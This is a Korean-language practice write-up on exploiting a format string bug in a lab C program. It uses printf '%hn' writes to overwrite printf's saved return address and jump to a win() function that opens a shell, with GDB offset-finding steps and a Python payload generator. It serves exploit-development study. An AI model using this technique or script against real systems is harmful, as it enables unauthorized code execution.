# Format String Vulnerability 2 — FS + ret2win

## 1. 목표

이 실습에서는 Format String Vulnerability를 이용해
**`printf`의 saved return address를 덮어 `win()`으로 흐름을 변경**한다.

* 쉘코드 주입 없이
* `%n` 계열 포맷 지정자만으로
* 함수 리턴 시 control flow를 탈취하는 것이 목표다.

---

## 2. 취약 코드

```c
void win(){
    puts("good!");
    setregid(getegid(), getegid());
    system("/bin/bash");
}

int main() {
    char buf[100];
    puts("input:");
    fgets(buf, sizeof(buf), stdin);
    printf(buf);     // format string vulnerability
    return 0;
}
```

### Environment

- Architecture: x86 (32-bit)
- PIE: disabled
- Stack Canary: disabled
- NX: enabled
- ASLR: disabled (for practice)

---

## 3. 왜 ret2win이 가능한가?

스택 상에서 `printf` 호출 시 구조는 다음과 같다 (32-bit, cdecl)

```
높은 주소
[ ... ]         ← printf가 가변 인자라고 착각하고 읽는 영역
[ fmt(&buf) ]   ← printf의 첫 번째 인자
[ saved RET ]   ← printf가 return할 주소
낮낮은 주소
```

- Format String을 이용해 printf의 saved RET가 저장된 메모리 위치에 win() 함수의 주소를 기록한다.
- 그러면 printf 함수가 return하는 순간 control flow가 win()으로 이동한다.

> **노트: Stack Canary와의 관계**
>
> 이 공격은 스택 버퍼 오버플로우가 아니라
> Format String을 이용한 **임의 주소 write**이기 때문에,
> stack canary는 검사 대상이 되지 않는다.
>
> 즉,
> canary가 활성화되어 있어도
> FS로 saved RET을 직접 덮을 수 있다면
> control flow 탈취가 가능하다.

---

## 4. Offset 계산 (buf 위치 확인)

기본적인 마커 기법을 이용한다.

입력:

```
AAAA.%x.%x.%x.%x.%x.%x.%x
```

출력에서 `41414141`이 관측된 위치를 기준으로
`buf`가 몇 번째 인자 슬롯으로 해석되는지 확인한다.

결과:

```
offset = 7
```

의미: printf가 7번째 인자라고 착각한 위치부터 buf 내용이 사용됨

---

## 5. printf의 saved RET 주소 찾기

`printf(buf)` 호출 직전에 GDB에서 스택을 확인한다.

```asm
lea eax, [ebp-0x6c]   ; &buf
push eax
call printf@plt
```

- `call` 직전의 `ESP`를 기준으로
- saved RET 슬롯 주소 = ESP - 4

GDB에서 확인:

```gdb
info reg esp
p/x $esp-4
```

즉, 다음과 같은 형태이다.

```
높은 주소
+--------------------+
│         buf        │     
+--------------------+  ← 0xffffcebc
│         ...        │  
+--------------------+
│      fmt(&buf)     │     
+--------------------+ ← esp(=0xffffcea0)
│  printf: saved RET │ 
+--------------------+ ← esp-4(=0xffffce9c)
낮은 주소
```

`si`로 `printf@plt` 진입 후:

```gdb
x/2wx $esp
```

```
[ $esp ]     → saved return address
[ $esp + 4 ] → fmt(&buf)
```

![saved ret slot](https://github.com/sage-502/pwnable-lab/blob/main/images/format-string-vuln2/00.png)

---

## 6. Write : `%hn`을 이용한 ret overwrite

- overwrite 대상: `printf` saved RET
- 목표 값: `win()` 함수 주소 (4바이트)

payload 개념 구조:

```
[ ret_slot ][ ret_slot+2 ]
%pad1c %7$hn
%pad2c %8$hn
```

- 하위 2바이트 → 상위 2바이트 순서로 기록
- 출력된 바이트 수 기준으로 pad 계산

---

## 7. payload 생성 코드

``` py
#!/usr/bin/env python3
import struct, sys

ret_slot = {printf_saved_ret_slot}
base = {offset}
win = {win_addr}

lo = win & 0xffff
hi = (win >> 16) & 0xffff

payload  = struct.pack("<I", ret_slot)
payload += struct.pack("<I", ret_slot + 2)

count = len(payload)  # 8

# write lower 2 bytes first, then higher 2 bytes
pad1 = (lo - count) % 0x10000
if pad1:
    payload += f"%{pad1}c".encode()
    count += pad1
payload += f"%{base}$hn".encode()

pad2 = (hi - count) % 0x10000
if pad2:
    payload += f"%{pad2}c".encode()
    count += pad2
payload += f"%{base+1}$hn".encode()

payload += b"\n"
sys.stdout.buffer.write(payload)
```

---

## 8. 결과

`printf`가 리턴하는 순간 control flow가 `win()`으로 이동하며:

![result](https://github.com/sage-502/pwnable-lab/blob/main/images/format-string-vuln2/01.png)

> **노트**
>
> GDB를 통해 실행한 경우와 터미널에서 직접 실행한 경우,
> 스택 프레임의 ***구조(layout)는 동일하지만 실제 주소 값은 달라질 수 있다.**
>
> 이는 GDB 자체의 실행 환경, argv/envp 구성, 디버깅 런타임의 영향으로
> 스택 시작 위치가 달라지기 때문이다.
>
> 이로 인해 절대주소 기반 exploit은 GDB 밖 환경에서 실패할 수 있으며,
> ASLR 환경에서는 leak 기반 계산이 필요해진다.
